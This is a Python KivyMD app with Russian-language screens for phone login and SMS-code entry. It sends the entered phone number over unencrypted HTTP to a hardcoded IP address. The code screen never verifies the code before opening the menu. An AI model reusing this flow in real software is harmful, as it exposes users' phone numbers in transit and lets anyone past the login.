import hashlib
from kivymd.app import MDApp
from kivymd.uix.screen import MDScreen
from kivymd.uix.button import MDRectangleFlatIconButton
from kivymd.uix.label import MDLabel
from kivy.lang import Builder
from kivymd.uix.button import MDRaisedButton #Прямоугольная Плоская кнопка MD
import requests
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.core.window import Window #Для размера окна
from kivy.uix.popup import Popup
from kivy.uix.screenmanager import ScreenManager, Screen, TransitionBase
from kivy.clock import Clock
Window.size = (480, 600)
# Create the manager
Builder.load_string("""
<Hi>:
    MDScreen:
        on_enter: 
            root.manager.current = 'autorith'
        FitImage:
            source: 'fS6tmUgBPmw.jpg'
            


<Autorith>:
    send_fone: fone
    ch: but
    MDScreen:
        FitImage:
            source: 'fS6tmUgBPmw.jpg'

        GridLayout:
            rows: 10

            BoxLayout:
                orientation: 'vertical'
            BoxLayout:
                orientation: 'vertical'
            BoxLayout:
                orientation: 'vertical'

                MDTextField:
                    id: fone
                    hint_text: "Введите номер телефона"
                    line_color_focus: 1, 0, 1, 1
                    multiline: False
                    size_hint: .6 , .1
                    pos_hint: {'center_x':0.5,'center_y':0.7}
            BoxLayout:
                orientation: 'vertical'    
                MDTextButton:
                    id: but
                    pos_hint: {'center_x':0.5,'center_y':0.5}
                    size_hint: 0.5,0.1
                    text: "Войти"
                    font_size:  '25sp'
                    icon: "android"
                    theme_text_color: "Custom"
                    on_release:
                        root.send()
                        root.manager.current = 'code'    

            BoxLayout:
                orientation: 'vertical'
            BoxLayout:
                orientation: 'vertical'
            BoxLayout:
                orientation: 'vertical'
            BoxLayout:
                orientation: 'vertical'
            BoxLayout:
                orientation: 'vertical'        
            BoxLayout:
                orientation: 'vertical'
<Code>:
    send_cod: cod
    MDScreen:
        FitImage:
            source: 'fS6tmUgBPmw.jpg'

        GridLayout:
            rows: 10

            BoxLayout:
                orientation: 'vertical'
            BoxLayout:
                orientation: 'vertical'
            BoxLayout:
                orientation: 'vertical'

                MDTextField:
                    id: cod
                    hint_text: "Введите код из сообщения"
                    line_color_focus: 1, 0, 1, 1
                    multiline: False
                    size_hint: .6 , .1
                    pos_hint: {'center_x':0.5,'center_y':0.7}
            BoxLayout:
                orientation: 'vertical'    
                MDTextButton:
                    pos_hint: {'center_x':0.5,'center_y':0.5}
                    size_hint: 0.5,0.1
                    text: "Подтвердить"
                    font_size:  '25sp'
                    icon: "android"
                    theme_text_color: "Custom"
                    on_release:
                        root.sendcode()
                        root.manager.current = 'menu'

            BoxLayout:
                orientation: 'vertical'
            BoxLayout:
                orientation: 'vertical'
            BoxLayout:
                orientation: 'vertical'
            BoxLayout:
                orientation: 'vertical'
            BoxLayout:
                orientation: 'vertical'        
            BoxLayout:
                orientation: 'vertical'
<Menu>:
    
    MDScreen:
        FitImage:
            source: 'fS6tmUgBPmw.jpg'
""")
sm = ScreenManager()

hesh1=''
hesh2=''

class Menu(Screen):
    pass

class Code(Screen):
    def sendcode(self):
        cd = self.send_cod.text

        sm.switch_to(Menu(name='menu'))

        

class Autorith(Screen):
    def send(self):
        fone = self.send_fone.text
        hesh1 = requests.get('http://45.128.207.185:8000',params={'phone':fone})
        sm.switch_to(Code(name='code'))



#class Hi(Screen):
#    def no_args_func(self):
#        while(1):
#            if(3==Clock.get.fps):
#                print('t')
#                sm.add_widget(Autorith(name='autorith'))
#                sm.current = 'hi' 
#                TransitionBase.start(sm)

        


class MainApp(MDApp):
    def build(self):
        self.theme_cls.primary_palette = "BlueGray" #Основная палтра
        self.theme_cls.theme_style = "Light"           #Общий фон
        
        sm.add_widget(Autorith(name='autorith'))
        #sm.add_widget(Hi(name='hi'))
        #sm.add_widget(Code(name='code'))
        sm.current = 'autorith'
        return sm

    


        
if __name__ == '__main__':     
    MainApp().run()